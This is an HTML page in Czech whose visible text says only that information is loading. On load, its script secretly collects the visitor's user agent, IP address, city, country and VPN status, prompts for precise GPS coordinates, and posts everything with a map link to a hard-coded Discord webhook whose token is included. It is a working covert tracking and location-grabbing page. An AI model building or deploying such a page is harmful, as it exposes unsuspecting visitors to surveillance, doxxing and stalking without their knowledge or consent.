<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Detekce Informac√≠</title>
</head>
<body>
    <h2>Naƒç√≠t√°n√≠ informac√≠...</h2>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";

        function sendToWebhook(data) {
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: data })
            }).catch(err => console.error("Chyba p≈ôi odes√≠l√°n√≠:", err));
        }

        function getDeviceInfo() {
            return `üì± Za≈ô√≠zen√≠: ${navigator.userAgent}`;
        }

        function getIPInfo(callback) {
            fetch("https://ipapi.co/json/")
                .then(response => response.json())
                .then(data => {
                    let ipMessage = `üåç IP Adresa: ${data.ip || "Nezn√°m√°"} (Mƒõsto: ${data.city || "Nezn√°m√©"}, Zemƒõ: ${data.country || "Nezn√°m√©"})\nüåê VPN: ${data.proxy ? "Ano" : "Ne"}`;
                    callback(ipMessage);
                })
                .catch(error => {
                    console.error("Chyba p≈ôi z√≠sk√°v√°n√≠ IP:", error);
                    callback("üåç IP Adresa: Nezn√°m√°\nüåê VPN: Nezn√°m√©");
                });
        }

        function sendInitialData() {
            getIPInfo(ipData => {
                let message = `${getDeviceInfo()}\n${ipData}\nüìç GPS: Nepovoleno`;
                sendToWebhook(message);
                askForLocation();  
            });
        }

        function askForLocation() {
            navigator.permissions.query({ name: "geolocation" }).then(result => {
                if (result.state === "granted") {
                    getLocation();  // Poloha u≈æ je povolen√°
                } else if (result.state === "prompt") {
                    navigator.geolocation.getCurrentPosition(getLocation, () => {
                        console.error("U≈æivatel odm√≠tl polohu");
                    }, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                } else {
                    console.warn("P≈ô√≠stup k poloze byl zablokov√°n v nastaven√≠ prohl√≠≈æeƒçe");
                }
            });
        }

        function getLocation(position) {
            let { latitude, longitude } = position.coords;
            let mapLink = `https://en.mapy.cz/zakladni?q=${latitude}%2C%20${longitude}&x=${longitude}&y=${latitude}&z=15`;
            let gpsMessage = `üìç GPS Sou≈ôadnice: ${latitude}, ${longitude}\nüîó Mapa: [Zobrazit na Mapy.cz](${mapLink})`;
            
            getIPInfo(ipData => {
                let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
                sendToWebhook(message);
            });
        }

        // ‚úÖ Automaticky po≈æ√°d√° o polohu ihned po naƒçten√≠
        sendInitialData();
    </script>
</body>
</html>
